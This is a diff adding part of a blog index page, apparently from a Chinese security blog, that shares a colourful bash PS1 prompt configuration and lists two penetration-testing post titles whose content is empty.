+        <a href="/2017/05/15/RainbowCrack/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/05/15/PS1/">
+                烦躁的不行……,调了个好看的 PS1
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-15</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/PS1/">PS1</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>00x1 最近,各种事儿,烦躁的不行,以此发泄下乱七八糟的情绪,顺手分享给大家,希望生活不只单调,还有诗和远方:</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># cd </div><div class="line"># vi .bash_profile   把PS1换成下面的语句</div><div class="line">	PS1="<span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\0</span>33[35m<span class="symbol">\]</span><span class="symbol">\t</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span> - <span class="symbol">\[</span><span class="symbol">\0</span>33[36m<span class="symbol">\]</span><span class="symbol">\u</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span>@<span class="symbol">\[</span><span class="symbol">\0</span>33[32m<span class="symbol">\]</span><span class="symbol">\h</span> :)<span class="symbol">\n</span><span class="symbol">\[</span><span class="symbol">\0</span>33[33;1m<span class="symbol">\]</span><span class="symbol">\w</span><span class="symbol">\[</span><span class="symbol">\0</span>33[m<span class="symbol">\]</span> =&gt; "</div><div class="line"># source .bash_profile</div></pre></td></tr></table></figure>
+<p><img src="/img/PS1.png" alt=""><br>
+        </div>
+        <a href="/2017/05/15/PS1/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/05/08/network-pentest/">
+                常规内网渗透基本流程小结 [ 内网 1 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-08</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/network-pentset/">network pentset</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/05/07/dc-pentest/">
+                常规单域内网渗透流程小结 [ 域内网 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-07</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/dc-pentset/">dc pentset</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            
         </div>
     
 
